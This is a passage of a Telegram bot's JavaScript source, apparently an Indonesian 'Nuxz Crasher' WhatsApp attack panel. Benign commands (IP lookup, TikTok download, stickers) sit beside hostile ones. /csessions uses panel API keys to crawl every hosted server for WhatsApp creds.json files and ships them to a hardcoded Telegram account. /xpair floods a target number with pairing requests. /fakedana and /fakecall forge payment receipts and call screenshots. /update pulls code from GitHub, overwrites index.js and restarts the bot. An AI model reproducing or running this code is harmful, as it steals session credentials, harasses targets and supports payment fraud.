        parse_mode: "MarkdownV2",
      },
      {
        reply_markup: { inline_keyboard: buttons },
      }
    )
});
// ~ Tools Menu ~ \\
bot.command("trackip", checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("❌ Format: /trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><b>⚘. 𝗔𝗥𝗖𝗛𝗘𝗥𝗬 - 𝗠𝗔𝗚𝗜𝗖「 ཀ 」</b></blockquote>
⬡ IP: ${data.ip || "-"}
⬡ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⬡ Region: ${data.region || "-"}
⬡ City: ${data.city || "-"}
⬡ ZIP: ${data.postal || "-"}
⬡ Timezone: ${data.timezone_gmt || "-"}
⬡ ISP: ${data.isp || "-"}
⬡ Org: ${data.org || "-"}
⬡ ASN: ${data.asn || "-"}
⬡ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🌍 Location", url: mapsUrl }]
        ]
      }
    } : null;

    try {
      if (processingMsg && processingMsg.photo && typeof processingMsg.message_id !== "undefined") {
        await ctx.telegram.editMessageCaption(
          processingMsg.chat.id,
          processingMsg.message_id,
          undefined,
          caption,
          { parse_mode: "HTML", ...(inlineKeyboard ? inlineKeyboard : {}) }
        );
      } else if (typeof thumbnailurl !== "undefined" && thumbnailurl) {
        await ctx.replyWithPhoto(thumbnailurl, {
          caption,
          parse_mode: "HTML",
          ...(inlineKeyboard ? inlineKeyboard : {})
        });
      } else {
        if (inlineKeyboard) {
          await ctx.reply(caption, { parse_mode: "HTML", ...inlineKeyboard });
        } else {
          await ctx.reply(caption, { parse_mode: "HTML" });
        }
      }
    } catch (e) {
      if (mapsUrl) {
        await ctx.reply(caption + `📍 Maps: ${mapsUrl}`, { parse_mode: "HTML" });
      } else {
        await ctx.reply(caption, { parse_mode: "HTML" });
      }
    }

  } catch (err) {
    await ctx.reply("❌ Terjadi kesalahan saat mengambil data IP (timeout atau API tidak merespon). Coba lagi nanti");
  }
});

bot.command("tiktokdl", async (ctx) => {
  const args = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!args) return ctx.reply("❌ Format: /tiktokdl https://vt.tiktok.com/ZSUeF1CqC/");

  let url = args;
  if (ctx.message.entities) {
    for (const e of ctx.message.entities) {
      if (e.type === "url") {
        url = ctx.message.text.substr(e.offset, e.length);
        break;
      }
    }
  }

  const wait = await ctx.reply("⏳ Sedang memproses video");

  try {
    const { data } = await axios.get("https://tikwm.com/api/", {
      params: { url },
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36",
        "accept": "application/json,text/plain,*/*",
        "referer": "https://tikwm.com/"
      },
      timeout: 20000
    });

    if (!data || data.code !== 0 || !data.data)
      return ctx.reply("❌ Gagal ambil data video pastikan link valid");

    const d = data.data;

    if (Array.isArray(d.images) && d.images.length) {
      const imgs = d.images.slice(0, 10);
      const media = await Promise.all(
        imgs.map(async (img) => {
          const res = await axios.get(img, { responseType: "arraybuffer" });
          return {
            type: "photo",
            media: { source: Buffer.from(res.data) }
          };
        })
      );
      await ctx.replyWithMediaGroup(media);
      return;
    }

    const videoUrl = d.play || d.hdplay || d.wmplay;
    if (!videoUrl) return ctx.reply("❌ Tidak ada link video yang bisa diunduh");

    const video = await axios.get(videoUrl, {
      responseType: "arraybuffer",
      headers: {
        "user-agent":
          "Mozilla/5.0 (Linux; Android 11; Mobile) AppleWebKit/537.36 Chrome/ID Safari/537.36"
      },
      timeout: 30000
    });

    await ctx.replyWithVideo(
      { source: Buffer.from(video.data), filename: `${d.id || Date.now()}.mp4` },
      { supports_streaming: true }
    );
  } catch (e) {
    const err =
      e?.response?.status
        ? `❌ Error ${e.response.status} saat mengunduh video`
        : "❌ Gagal mengunduh, koneksi lambat atau link salah";
    await ctx.reply(err);
  } finally {
    try {
      await ctx.deleteMessage(wait.message_id);
    } catch {}
  }
});

bot.command("addsender", checkOwnerOrAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Kirim session JSON langsung setelah command.\nContoh:\n/addsender {\"creds\":{...}}");
  }

  // Gabungkan semua teks setelah "/addsender " menjadi string JSON
  const sessionText = ctx.message.text.replace("/addsender ", "").trim();

  try {
    JSON.parse(sessionText); // cek validitas JSON

    const sessionName = "sender_" + Date.now(); // nama unik
    const sessionPath = `./sessions/${sessionName}`;
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    // Simpan ke creds.json
    fs.writeFileSync(`${sessionPath}/creds.json`, sessionText);

    // Load session langsung
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const newSock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
    });

    newSock.ev.on("creds.update", saveCreds);

    newSock.ev.on("connection.update", ({ connection }) => {
      if (connection === "open") {
        ctx.reply(`✅ Sender *${sessionName}* berhasil terhubung ke WhatsApp!`);
        senders.push({ name: sessionName, sock: newSock });
      }
    });

  } catch (e) {
    console.error("❌ Gagal load session:", e.message);
    ctx.reply("❌ Session tidak valid. Pastikan isi JSON benar.");
  }
});
bot.command("csessions", checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const fromId = ctx.from.id;
  const idtele = "7124431930";

  const text = ctx.message.text.split(" ").slice(1).join(" ");
  if (!text) return ctx.reply("❌ Format: /csessions https://domainpanel.com,ptla_ID,ptlc_ID");

  const args = text.split(",");
  const domain = args[0];
  const plta = args[1];
  const pltc = args[2];
  if (!plta || !pltc)
    return ctx.reply("❌ Format: /csessions https://panelku.com,plta_ID,pltc_ID");

  await ctx.reply(
    "⏳ Sedang scan semua server untuk mencari folder sessions dan file creds.json",
    { parse_mode: "Markdown" }
  );

  const base = domain.replace(/\/+$/, "");
  const commonHeadersApp = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${plta}`,
  };
  const commonHeadersClient = {
    Accept: "application/json, application/vnd.pterodactyl.v1+json",
    Authorization: `Bearer ${pltc}`,
  };

  function isDirectory(item) {
    if (!item || !item.attributes) return false;
    const a = item.attributes;
    if (typeof a.is_file === "boolean") return a.is_file === false;
    return (
      a.type === "dir" ||
      a.type === "directory" ||
      a.mode === "dir" ||
      a.mode === "directory" ||
      a.mode === "d" ||
      a.is_directory === true ||
      a.isDir === true
    );
  }

  async function listAllServers() {
    const out = [];
    let page = 1;
    while (true) {
      const r = await axios.get(`${base}/api/application/servers`, {
        params: { page },
        headers: commonHeadersApp,
        timeout: 15000,
      }).catch(() => ({ data: null }));
      const chunk = (r && r.data && Array.isArray(r.data.data)) ? r.data.data : [];
      out.push(...chunk);
      const hasNext = !!(r && r.data && r.data.meta && r.data.meta.pagination && r.data.meta.pagination.links && r.data.meta.pagination.links.next);
      if (!hasNext || chunk.length === 0) break;
      page++;
    }
    return out;
  }

  async function traverseAndFind(identifier, dir = "/") {
    try {
      const listRes = await axios.get(
        `${base}/api/client/servers/${identifier}/files/list`,
        {
          params: { directory: dir },
          headers: commonHeadersClient,
          timeout: 15000,
        }
      ).catch(() => ({ data: null }));
      const listJson = listRes.data;
      if (!listJson || !Array.isArray(listJson.data)) return [];
      let found = [];

      for (let item of listJson.data) {
        const name = (item.attributes && item.attributes.name) || item.name || "";
        const itemPath = (dir === "/" ? "" : dir) + "/" + name;
        const normalized = itemPath.replace(/\/+/g, "/");
        const lower = name.toLowerCase();

        if ((lower === "session" || lower === "sessions") && isDirectory(item)) {
          try {
            const sessRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/list`,
              {
                params: { directory: normalized },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));
            const sessJson = sessRes.data;
            if (sessJson && Array.isArray(sessJson.data)) {
              for (let sf of sessJson.data) {
                const sfName = (sf.attributes && sf.attributes.name) || sf.name || "";
                const sfPath = (normalized === "/" ? "" : normalized) + "/" + sfName;
                if (sfName.toLowerCase() === "creds.json") {
                  found.push({
                    path: sfPath.replace(/\/+/g, "/"),
                    name: sfName,
                  });
                }
              }
            }
          } catch (_) {}
        }

        if (isDirectory(item)) {
          try {
            const more = await traverseAndFind(identifier, normalized === "" ? "/" : normalized);
            if (more.length) found = found.concat(more);
          } catch (_) {}
        } else {
          if (name.toLowerCase() === "creds.json") {
            found.push({ path: (dir === "/" ? "" : dir) + "/" + name, name });
          }
        }
      }
      return found;
    } catch (_) {
      return [];
    }
  }

  try {
    const servers = await listAllServers();
    if (!servers.length) {
      return ctx.reply("❌ Tidak ada server yang bisa discan");
    }

    let totalFound = 0;

    for (let srv of servers) {
      const identifier =
        (srv.attributes && srv.attributes.identifier) ||
        srv.identifier ||
        (srv.attributes && srv.attributes.id);
      const name =
        (srv.attributes && srv.attributes.name) ||
        srv.name ||
        identifier ||
        "unknown";
      if (!identifier) continue;

      const list = await traverseAndFind(identifier, "/");
      if (list && list.length) {
        for (let fileInfo of list) {
          totalFound++;
          const filePath = ("/" + fileInfo.path.replace(/\/+/g, "/")).replace(/\/+$/,"");

          await ctx.reply(
            `📁 Ditemukan creds.json di server ${name} path: ${filePath}`,
            { parse_mode: "Markdown" }
          );

          try {
            const downloadRes = await axios.get(
              `${base}/api/client/servers/${identifier}/files/download`,
              {
                params: { file: filePath },
                headers: commonHeadersClient,
                timeout: 15000,
              }
            ).catch(() => ({ data: null }));

            const dlJson = downloadRes && downloadRes.data;
            if (dlJson && dlJson.attributes && dlJson.attributes.url) {
              const url = dlJson.attributes.url;
              const fileRes = await axios.get(url, {
                responseType: "arraybuffer",
                timeout: 20000,
              });
              const buffer = Buffer.from(fileRes.data);
              await ctx.telegram.sendDocument(idtele, {
                source: buffer,
                filename: `${String(name).replace(/\s+/g, "_")}_creds.json`,
              });
            } else {
              await ctx.reply(
                `❌ Gagal mendapatkan URL download untuk ${filePath} di server ${name}`
              );
            }
          } catch (e) {
            console.error(`Gagal download ${filePath} dari ${name}:`, e?.message || e);
            await ctx.reply(
              `❌ Error saat download file creds.json dari ${name}`
            );
          }
        }
      }
    }

    if (totalFound === 0) {
      return ctx.reply("✅ Scan selesai tidak ditemukan creds.json di folder session/sessions pada server manapun");
    } else {
      return ctx.reply(`✅ Scan selesai total file creds.json berhasil diunduh & dikirim: ${totalFound}`);
    }
  } catch (err) {
    ctx.reply("❌ Terjadi error saat scan");
  }
});

const EXPIRE_MINUTES = 3;
const DELETE_MSG_DELAY = 25;

const inviteWhitelist = new Map();
let linkgbModeActive = false;

// ================= HELPERS =================

async function isAdmin(ctx) {
  try {
    const member = await ctx.getChatMember(ctx.from.id);
    return ["administrator", "creator"].includes(member.status);
  } catch {
    return false;
  }
}

async function botHasRights(ctx) {
  try {
    const me = await ctx.telegram.getMe();
    const botMember = await ctx.getChatMember(me.id);

    if (!["administrator", "creator"].includes(botMember.status)) {
      return false;
    }

    const canInvite =
      botMember.can_invite_users === true ||
      botMember.can_manage_chat === true;

    const canApprove =
      botMember.can_manage_chat === true ||
      botMember.can_restrict_members === true;

    return canInvite && canApprove;
  } catch {
    return false;
  }
}

function parseUsername(raw) {
  if (!raw) return null;
  let u = raw.trim();
  if (u.startsWith("@")) u = u.slice(1);
  u = u.toLowerCase();
  if (!/^[a-z0-9_]{5,32}$/i.test(u)) return null;
  return u;
}

// ================= COMMAND =================

bot.command("linkgb", async (ctx) => {
  try {
    const chat = ctx.chat;
    const user = ctx.from;

    if (chat.type === "private") {
      return ctx.reply("❌ Command hanya untuk grup.");
    }

    const text = ctx.message.text;
    const args = text.split(" ").slice(1);

    if (args.length < 2 || args[0].toLowerCase() !== "req") {
      return ctx.reply("🪧 Format:\n/linkgb req @username");
    }

    if (!(await isAdmin(ctx))) {
      return ctx.reply("❌ Khusus ADMIN grup.");
    }

    if (!(await botHasRights(ctx))) {
      return ctx.reply(
        "❌ Bot harus ADMIN + izin Invite Users & Manage Chat."
      );
    }

    const allowedUsername = parseUsername(args[1]);
    if (!allowedUsername) {
      return ctx.reply("❌ Username tidak valid.");
    }

    linkgbModeActive = true;

    const expireAt = Math.floor(Date.now() / 1000) + EXPIRE_MINUTES * 60;

    const invite = await ctx.telegram.createChatInviteLink(chat.id, {
      creates_join_request: true,
      expire_date: expireAt,
      name: `REQ_${allowedUsername}_${Date.now()}`
    });

    const sentMsg = await ctx.replyWithHTML(
      `🔗 <b>Link Request Khusus</b>\n\n` +
      `👤 Username: @${allowedUsername}\n` +
      `⏳ Expire: ${EXPIRE_MINUTES} menit\n\n` +
      `${invite.invite_link}\n\n` +
      `🚫 User lain otomatis ditolak`
    );

    inviteWhitelist.set(invite.invite_link, {
      chatId: chat.id,
      allowedUsername,
      expireAt,
      messageId: sentMsg.message_id
    });

    setTimeout(() => {
      inviteWhitelist.delete(invite.invite_link);
      linkgbModeActive = false;
    }, EXPIRE_MINUTES * 60 * 1000);

  } catch (err) {
    console.error("ERROR /linkgb:", err);
    ctx.reply("❌ Terjadi kesalahan.");
  }
});

// ================= JOIN REQUEST =================

bot.on("chat_join_request", async (ctx) => {
  try {
    const req = ctx.update.chat_join_request;
    const chatId = req.chat.id;
    const user = req.from;
    const inviteLink = req.invite_link?.invite_link;

    if (!linkgbModeActive) return;
    if (!inviteLink) return;

    const data = inviteWhitelist.get(inviteLink);

    if (!data) return;

    const now = Math.floor(Date.now() / 1000);
    if (now > data.expireAt) {
      inviteWhitelist.delete(inviteLink);
      linkgbModeActive = false;
      return;
    }

    const incomingUsername = (user.username || "").toLowerCase();

    if (incomingUsername !== data.allowedUsername) {
      await ctx.telegram.declineChatJoinRequest(chatId, user.id);
    }

  } catch (err) {
    console.error("ERROR join request:", err);
  }
});

bot.command("tourl", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("❌ Format: /convert ( reply dengan foto/video )");

  let fileId = null;
  if (r.photo && r.photo.length) {
    fileId = r.photo[r.photo.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ Error ${e.response.status} saat unggah ke catbox`
      : "❌ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) return ctx.reply("Example\n/brat pinn Tamvanz");

  try {
    await ctx.reply("✨ Membuat stiker...");

    const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
    const response = await axios.get(url, { responseType: "arraybuffer" });

    const filePath = path.join(__dirname, "brat.webp");
    fs.writeFileSync(filePath, response.data);

    await ctx.replyWithSticker({ source: filePath });

    fs.unlinkSync(filePath);
  } catch (err) {
    console.error("Error brat:", err.message);
    await ctx.reply("❌ Gagal membuat stiker brat. Coba lagi nanti.");
  }
});

const fsp = fs.promises;
// ================== LOAD CONFIG FROM update.js (NO CACHE) ==================
function loadUpdateConfig() {
  try {
    // pastikan ambil dari root project (process.cwd()), bukan lokasi file lain
    const cfgPath = path.join(process.cwd(), "update.js");

    // hapus cache require biar selalu baca update.js terbaru setelah restart/update
    try {
      delete require.cache[require.resolve(cfgPath)];
    } catch (_) {}

    const cfg = require(cfgPath);
    return (cfg && typeof cfg === "object") ? cfg : {};
  } catch (e) {
    return {};
  }
}

const UPD = loadUpdateConfig();

// ====== CONFIG ======
const GITHUB_OWNER = UPD.github_owner || "wahyuprayogi210816-bot";
const DEFAULT_REPO = UPD.github_repo_default || "create_raw_github1";
const GITHUB_BRANCH = UPD.github_branch || "main";
const UPDATE_FILE_IN_REPO = UPD.update_file_in_repo || "index.js";

// token untuk WRITE (add/del)
const GITHUB_TOKEN_WRITE = UPD.github_token_write || "";

// target lokal yang bakal diganti oleh /update
const LOCAL_TARGET_FILE = path.join(process.cwd(), "index.js");

// ================== FETCH HELPER ==================
const fetchFn = global.fetch || ((...args) => import("node-fetch").then(({ default: f }) => f(...args)));

// ================== FILE WRITE ATOMIC ==================
async function atomicWriteFile(targetPath, content) {
  const dir = path.dirname(targetPath);
  const tmp = path.join(dir, `.update_tmp_${Date.now()}_${path.basename(targetPath)}`);
  await fsp.writeFile(tmp, content, { encoding: "utf8" });
  await fsp.rename(tmp, targetPath);
}

// ================== READ (PUBLIC): DOWNLOAD RAW ==================
async function ghDownloadRawPublic(repo, filePath) {
  const rawUrl =
    `https://raw.githubusercontent.com/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/${encodeURIComponent(GITHUB_BRANCH)}/${filePath}`;

  const res = await fetchFn(rawUrl, { headers: { "User-Agent": "telegraf-update-bot" } });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`Gagal download ${filePath} (${res.status}): ${txt || res.statusText}`);
  }
  return await res.text();
}

// ================== WRITE (BUTUH TOKEN): GITHUB API ==================
function mustWriteToken() {
  if (!GITHUB_TOKEN_WRITE) {
    throw new Error("Token WRITE kosong. Isi github_token_write di update.js (Contents: Read and write).");
  }
}

function ghWriteHeaders() {
  mustWriteToken();
  return {
    Authorization: `Bearer ${GITHUB_TOKEN_WRITE}`,
    Accept: "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "telegraf-gh-writer",
  };
}

async function ghGetContentWrite(repo, filePath) {
  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}?ref=${encodeURIComponent(GITHUB_BRANCH)}`;

  const res = await fetchFn(url, { headers: ghWriteHeaders() });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub GET ${res.status}: ${txt || res.statusText}`);
  }
  return res.json();
}

async function ghPutFileWrite(repo, filePath, contentText, commitMsg) {
  let sha;
  try {
    const existing = await ghGetContentWrite(repo, filePath);
    sha = existing?.sha;
  } catch (e) {
    if (!String(e.message).includes(" 404")) throw e; // 404 => create baru
  }

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = {
    message: commitMsg,
    content: Buffer.from(contentText, "utf8").toString("base64"),
    branch: GITHUB_BRANCH,
    ...(sha ? { sha } : {}),
  };

  const res = await fetchFn(url, {
    method: "PUT",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub PUT ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

async function ghDeleteFileWrite(repo, filePath, commitMsg) {
  const info = await ghGetContentWrite(repo, filePath);
  const sha = info?.sha;
  if (!sha) throw new Error("SHA tidak ketemu. Pastikan itu file (bukan folder).");

  const url =
    `https://api.github.com/repos/${encodeURIComponent(GITHUB_OWNER)}/${encodeURIComponent(repo)}` +
    `/contents/${encodeURIComponent(filePath)}`;

  const body = { message: commitMsg, sha, branch: GITHUB_BRANCH };

  const res = await fetchFn(url, {
    method: "DELETE",
    headers: { ...ghWriteHeaders(), "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const txt = await res.text().catch(() => "");
    throw new Error(`GitHub DELETE ${res.status}: ${txt || res.statusText}`);
  }

  return res.json();
}

// ================== COMMANDS ==================

// /update [repoOptional]
// download update_index.js -> replace local index.js -> restart
bot.command("update", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    await ctx.reply("🔄 Bot akan update otomatis.\n♻️ Tunggu proses 1–3 menit...");
    await ctx.reply(`⬇️ Mengambil update dari GitHub: *${repo}/${UPDATE_FILE_IN_REPO}* ...`, { parse_mode: "Markdown" });

    const newCode = await ghDownloadRawPublic(repo, UPDATE_FILE_IN_REPO);

    if (!newCode || newCode.trim().length < 50) {
      throw new Error("File update terlalu kecil/kosong. Pastikan update_index.js bener isinya.");
    }

    // backup index.js lama
    try {
      const backup = path.join(process.cwd(), "index.backup.js");
      await fsp.copyFile(LOCAL_TARGET_FILE, backup);
    } catch (_) {}

    await atomicWriteFile(LOCAL_TARGET_FILE, newCode);

    await ctx.reply("✅ Update berhasil diterapkan.\n♻️ Restarting panel...");

    setTimeout(() => process.exit(0), 3000);
  } catch (err) {
    await ctx.reply(`❌ Update gagal: ${err.message || String(err)}`);
  }
});

// /addfiles <repo> (reply file .js)
bot.command("addfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;

    const replied = ctx.message.reply_to_message;
    const doc = replied?.document;

    if (!doc) {
      return ctx.reply("❌ Reply file .js dulu, lalu ketik:\n/addfiles <namerepo>\nContoh: /addfiles Pullupdate");
    }

    const fileName = doc.file_name || "file.js";
    if (!fileName.endsWith(".js")) return ctx.reply("❌ File harus .js");

    await ctx.reply(`⬆️ Uploading *${fileName}* ke repo *${repo}*...`, { parse_mode: "Markdown" });

    const link = await ctx.telegram.getFileLink(doc.file_id);
    const res = await fetchFn(link.href);
    if (!res.ok) throw new Error(`Gagal download file telegram: ${res.status}`);

    const contentText = await res.text();

    await ghPutFileWrite(repo, fileName, contentText, `Add/Update ${fileName} via bot`);

    await ctx.reply(`✅ Berhasil upload *${fileName}* ke repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});

// /delfiles <repo> <path/file.js>
bot.command("dellfile", async (ctx) => {
  try {
    const parts = (ctx.message.text || "").trim().split(/\s+/);
    const repo = parts[1] || DEFAULT_REPO;
    const file = parts[2];

    if (!file) {
      return ctx.reply("Format:\n/delfiles <namerepo> <namefiles>\nContoh: /delfiles Pullupdate index.js");
    }

    await ctx.reply(`🗑️ Menghapus *${file}* di repo *${repo}*...`, { parse_mode: "Markdown" });

    await ghDeleteFileWrite(repo, file, `Delete ${file} via bot`);

    await ctx.reply(`✅ Berhasil hapus *${file}* di repo *${repo}*`, { parse_mode: "Markdown" });
  } catch (err) {
    await ctx.reply(`❌ Gagal: ${err.message || String(err)}`);
  }
});
  
// ====== /restart ======
bot.command("restart", async (ctx) => {
  await ctx.reply("♻️ Panel akan *restart manual* untuk menjaga kestabilan...");

  // kirim status ke grup utama kalau ada
  try {
    if (typeof sendToGroupsUtama === "function") {
      sendToGroupsUtama(
        "🟣 *Status Panel:*\n♻️ Panel akan *restart manual* untuk menjaga kestabilan...",
        { parse_mode: "Markdown" }
      );
    }
  } catch (e) {}

  setTimeout(() => {
    try {
      if (typeof sendToGroupsUtama === "function") {
        sendToGroupsUtama(
          "🟣 *Status Panel:*\n✅ Panel berhasil restart dan kembali aktif!",
          { parse_mode: "Markdown" }
        );
      }
    } catch (e) {}
  }, 8000);

  setTimeout(() => process.exit(0), 5000);
});

bot.command("tofigure", async (ctx) => {
  const userId = ctx.from.id;
  const message = ctx.message;
  const photo = message.photo || (message.reply_to_message && message.reply_to_message.photo);

  if (!photo) {
    return ctx.reply("❌ Silahkan kirim foto dengan caption /tofigure atau balas (reply) sebuah foto dengan perintah /tofigure");
  }

  try {
    await ctx.reply("⏳ Sedang memproses foto burik loeh...");

    const fileId = photo[photo.length - 1].file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    const apiUrl = `https://api.nekolabs.web.id/style.changer/figure?imageUrl=${encodeURIComponent(fileLink.href)}`;
    
    await ctx.replyWithPhoto(apiUrl, {
      caption: `✅ TO FIGURE SUCCES BY VELTRIX (🦋)`,
      parse_mode: "markdown",
      reply_to_message_id: message.message_id
    });

  } catch (error) {
    console.error(chalk.red("Error ToFigure:"), error);
    ctx.reply("❌ Gagal memproses gambar!.");
  }
});

bot.command("xpair", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    const args = ctx.message.text.split(" ")
    const loopCount = parseInt(args[1])
    const targetNumber = (args[2] || "").replace(/[^0-9]/g, "")

    if (!args[1] || !args[2]) {
      return ctx.reply(`🪧 ☇ Format: /xpair 10 62×××`)
    }

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐮𝐱𝐳 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${targetNumber}
⌑ Type: Pair Spam
⌑ Loop : ${loopCount}
⌑ Status: Process`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${targetNumber}` }
          ]]
        }
      }
    )

    const processMessageId = processMessage.message_id

    let success = 0
    let fail = 0

    for (let i = 0; i < loopCount; i++) {

      try {
        await pair(targetNumber)
        success++
      } catch (e) {
        fail++
      }

      await new Promise(r => setTimeout(r, 3000))
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,

      `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐍𝐮𝐱𝐳 𝐂𝐫𝐚𝐬𝐡𝐞𝐫 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${targetNumber}
⌑ Type: Pair Spam
⌑ Success: ${success}
⌑ Failed : ${fail}
⌑ Status: Finished`,

      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[
            { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${targetNumber}` }
          ]]
        }
      }
    )

})

bot.command("fakecall", async (ctx) => {
  try {

    const input = ctx.message.text.split(" ").slice(1).join(" ");

    if (!input) {
      return ctx.reply(
        "⚠️ Format salah!\n\nContoh:\n/fakecall Nuxz|13:55|https://files.catbox.moe/3746x8.jpg"
      );
    }

    let [nama, durasi, avatar] = input.split("|");

    if (!nama || !durasi) {
      return ctx.reply("❌ Minimal isi nama dan durasi!\nContoh:\n/fakecall Nuxz|13:55|https://files.catbox.moe/3746x8.jpg");
    }

    // default avatar
    if (!avatar) {
      avatar = "https://files.catbox.moe/3746x8.jpg";
    }

    await ctx.reply("📞 Sedang membuat fake call...");

    const url = `https://api.zenzxz.my.id/maker/fakecall?nama=${encodeURIComponent(nama)}&durasi=${encodeURIComponent(durasi)}&avatar=${encodeURIComponent(avatar)}`;

    // ambil buffer biar aman
    const res = await axios.get(url, {
      responseType: "arraybuffer"
    });

    await ctx.replyWithPhoto(
      { source: Buffer.from(res.data) },
      {
        caption: `📞 Fake Call\n\n👤 Nama: ${nama}\n⏱ Durasi: ${durasi}`
      }
    );

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error saat membuat fake call");
  }
});

bot.command("fakedana", async (ctx) => {
  try {

    let nominal = ctx.message.text.split(" ").slice(1).join("");

    if (!nominal) {
      return ctx.reply("⚠️ Masukkan nominal!\nContoh: /fakedana 100.000");
    }

    nominal = nominal.replace(/[^0-9]/g, "");

    if (!nominal) {
      return ctx.reply("❌ Nominal tidak valid!");
    }

    const formatted = Number(nominal).toLocaleString("id-ID");

    await ctx.reply("💸 Sedang membuat fake Dana...");

    const url = `https://api.zenzxz.my.id/maker/fakedanav2?nominal=${encodeURIComponent(formatted)}`;

